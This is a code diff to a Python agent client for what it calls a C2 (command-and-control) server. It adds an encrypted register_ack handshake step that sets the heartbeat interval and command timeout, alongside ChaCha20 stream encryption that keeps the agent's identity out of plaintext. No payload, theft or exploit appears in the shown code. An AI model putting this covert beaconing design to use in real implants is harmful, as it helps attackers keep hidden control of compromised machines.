@@ -22,11 +22,14 @@ from common.crypto import DIR_AGENT_TO_C2, DIR_C2_TO_AGENT, ChaCha20, EncryptedS
 from common.protocol import (
     CMD_HEARTBEAT,
     CMD_REGISTER,
+    CMD_REGISTER_ACK,
     CMD_REGISTER_CONFIRM,
     CMD_REGISTER_RESPONSE,
     PacketReader,
+    decode_tlv,
     encode_control,
 )
+from runtime_config import MAX_TIMING_SECONDS, RuntimeConfig
 
 
 logger = logging.getLogger(__name__)
@@ -39,7 +42,7 @@ class AgentClient:
         c2_port: int,
         agent_id: str,
         auth_token: str,
-        heartbeat_interval: int = 30,
+        runtime: RuntimeConfig,
         reconnect_initial: float = 1.0,
         reconnect_max: float = 60.0,
     ) -> None:
@@ -47,7 +50,7 @@ class AgentClient:
         self._c2_port = c2_port
         self._agent_id = agent_id
         self._auth_token = auth_token
-        self._heartbeat_interval = max(1, int(heartbeat_interval or 30))
+        self._runtime = runtime
         self._reconnect_initial = max(1.0, float(reconnect_initial or 1.0))
         self._reconnect_max = max(self._reconnect_initial, float(reconnect_max or 60.0))
         self._reader = PacketReader()
@@ -99,15 +102,13 @@ class AgentClient:
         # per-connection nonce: after the challenge is verified, the (now
         # encrypted) register_confirm is the first packet of the Agent -> C2
         # encrypted stream, so the same tx must cover the confirm and all
-        # subsequent Agent -> C2 traffic.
-        ok, tx, rx = await self._handshake(reader, writer)
+        # subsequent Agent -> C2 traffic. _handshake also consumes the
+        # encrypted register_ack before returning the live stream.
+        ok, stream = await self._handshake(reader, writer)
         if not ok:
             logger.warning("registration handshake failed")
             writer.close()
             return
-        # Handshake + auth succeeded: the whole byte stream is now encrypted.
-        stream = EncryptedStream(reader, writer, tx, rx)
-        stream.absorb_leftover(self._reader)
         if self._reader.buffered:
             leftover = self._reader.drain_all()
             if self._on_packet is not None:
@@ -148,8 +149,12 @@ class AgentClient:
         cipher derived from this connection's nonce (the first packet of the
         Agent -> C2 ChaCha20 stream), so the identity never travels in plaintext.
 
-        Returns ``(False, None, None)`` on any verification failure; on success
-        returns ``(True, tx, rx)`` where tx/rx are the per-connection ciphers.
+        The C2 then sends an encrypted ``register_ack`` carrying the runtime
+        heartbeat interval and command timeout, which are applied to
+        ``self._runtime`` before this method returns.
+
+        Returns ``(False, None)`` on any failure; on success returns
+        ``(True, stream)`` with the live encrypted stream.
         """
         nonce = secrets.token_hex(16)
         req_id = self.next_request_id()
@@ -160,12 +165,12 @@ class AgentClient:
 
         expected = await self._receive_register_response(reader)
         if expected is None:
-            return False, None, None
+            return False, None
 
         local = hashlib.sha256((nonce + self._auth_token).encode("utf-8")).hexdigest()
         if not hmac.compare_digest(local, expected):
             logger.warning("auth verification failed (token mismatch)")
-            return False, None, None
+            return False, None
 
         tx_key, tx_nonce = derive_material(self._auth_token, nonce, DIR_AGENT_TO_C2)
         rx_key, rx_nonce = derive_material(self._auth_token, nonce, DIR_C2_TO_AGENT)
@@ -181,7 +186,56 @@ class AgentClient:
         async with self._write_lock:
             writer.write(tx.crypt(pkt))
             await writer.drain()
-        return True, tx, rx
+
+        stream = EncryptedStream(reader, writer, tx, rx)
+        # Bytes read alongside register_response belong to the encrypted
+        # C2 -> Agent stream; decrypt them before parsing the ACK.
+        stream.absorb_leftover(self._reader)
+        if not await self._receive_register_ack(stream):
+            return False, None
+        return True, stream
+
+    async def _receive_register_ack(self, stream: EncryptedStream) -> bool:
+        """Wait for register_ack([heartbeat_interval_sec, cmd_timeout])."""
+        deadline = time.time() + 30
+        while time.time() < deadline:
+            pkt = self._reader.next_packet()
+            if pkt is not None:
+                _req_id, _body_len, cmd, body = pkt
+                if cmd != CMD_REGISTER_ACK:
+                    logger.warning("expected register_ack, got cmd=%#x", cmd)
+                    return False
+                try:
+                    params = decode_tlv(body)
+                except Exception:
+                    return False
+                if len(params) < 2:
+                    return False
+                try:
+                    heartbeat = int(params[0])
+                    cmd_timeout = int(params[1])
+                except ValueError:
+                    return False
+                if (heartbeat <= 0 or heartbeat > MAX_TIMING_SECONDS
+                        or cmd_timeout <= 0 or cmd_timeout > MAX_TIMING_SECONDS):
+                    return False
+                self._runtime.update(heartbeat, cmd_timeout)
+                logger.info(
+                    "runtime timing from C2: heartbeat=%ds cmd_timeout=%ds",
+                    heartbeat, cmd_timeout,
+                )
+                return True
+            remaining = deadline - time.time()
+            if remaining <= 0:
+                return False
+            try:
+                chunk = await asyncio.wait_for(stream.read(4096), timeout=remaining)
+            except asyncio.TimeoutError:
+                return False
+            if not chunk:
+                return False
+            self._reader.feed(chunk)
+        return False
 
     async def _receive_register_response(self, reader: asyncio.StreamReader) -> Optional[str]:
         """Wait for the C2's register_response (challenge hash)."""
@@ -208,7 +262,9 @@ class AgentClient:
     async def _heartbeat_loop(self, stream: EncryptedStream) -> None:
         try:
             while True:
-                await asyncio.sleep(self._heartbeat_interval)
+                # Re-read each cycle so a register_ack update takes effect
+                # without restarting the agent.
+                await asyncio.sleep(self._runtime.heartbeat_interval())
                 req_id = self.next_request_id()
                 pkt = encode_control(req_id, CMD_HEARTBEAT, [str(_now())])
                 async with self._write_lock:
